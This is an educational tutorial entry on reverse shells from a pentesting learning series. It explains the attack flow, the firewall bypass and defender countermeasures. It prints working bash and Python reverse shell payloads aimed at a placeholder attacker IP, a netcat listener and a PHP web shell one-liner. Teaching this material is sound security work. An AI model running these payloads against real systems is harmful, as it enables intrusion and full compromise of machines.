# Day 09 - Reverse Shell

## What It Is
A Reverse Shell is a technique where the target machine initiates a connection back to the attacker's machine, giving the attacker an interactive command line session on the victim. Unlike a regular shell where you connect to a server, here the server connects to you. It's called "reverse" because the connection direction is flipped — the victim reaches out, the attacker listens.

## How It Works
Firewalls typically block incoming connections to a machine but allow outgoing ones. A bind shell (where the attacker connects to the victim) would get blocked. A reverse shell bypasses this because the victim machine makes the outgoing connection itself — which firewalls usually allow.

Attack flow:
1. Attacker sets up a listener on their machine waiting for incoming connections
2. Attacker gets code execution on the victim — through a web shell, exploit, phishing, or any other vulnerability
3. Attacker runs a reverse shell payload on the victim machine
4. Victim machine connects back to the attacker's IP and port
5. Attacker gets an interactive terminal session on the victim

Basic example:

```bash
# Step 1 - Attacker sets up listener (on attacker's machine)
nc -lvnp 4444

# Step 2 - Reverse shell payload (run on victim machine)
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

Once the victim runs that one line, the attacker gets a fully interactive bash session on the victim machine.

## Real-World Example
In web application pentesting, when an attacker finds a Remote Code Execution (RCE) vulnerability or a file upload that allows uploading a PHP web shell, the first thing they do is pop a reverse shell. For example after uploading a malicious PHP file:

```php
<?php system($_GET['cmd']); ?>
```

They use it to execute a reverse shell payload, turning a limited web shell into a full interactive terminal. From there they run LinPEAS (day 08), escalate privileges, and own the machine completely. This exact chain — RCE → reverse shell → privilege escalation — is the standard attack flow on platforms like HackTheBox and TryHackMe.

## Why It Matters
From an attacker's side, a reverse shell turns any code execution vulnerability into full interactive access. It's the bridge between "I can run commands" and "I fully control this machine." Combined with privilege escalation it means complete system compromise.

From a defender's side, outbound traffic monitoring is key — most organizations monitor inbound connections but ignore suspicious outbound ones. Egress filtering, application whitelisting, and endpoint detection tools that flag unusual outbound connections (like a web server suddenly connecting to an unknown external IP on port 4444) are the main defenses.

## Key Terms
- Reverse Shell: a shell session where the victim machine connects outbound to the attacker's listener
- Bind Shell: opposite of reverse shell — attacker connects inbound to a port opened on the victim
- Netcat (nc): a networking utility used to create listeners and send/receive data over TCP/UDP
- Payload: the code executed on the victim machine to establish the reverse shell connection
- RCE (Remote Code Execution): a vulnerability that allows running arbitrary commands on a remote machine

## One Tip / Tool

Tool: `Netcat` for basic shells and `revshells.com` for generating payloads in any language

```bash
# Attacker listener
nc -lvnp 4444

# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Upgrading to a stable TTY shell after connecting
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Bookmark `https://revshells.com` — it generates reverse shell payloads in every language (bash, python, php, ruby, perl, powershell) with your IP and port pre-filled. Every pentester uses it.
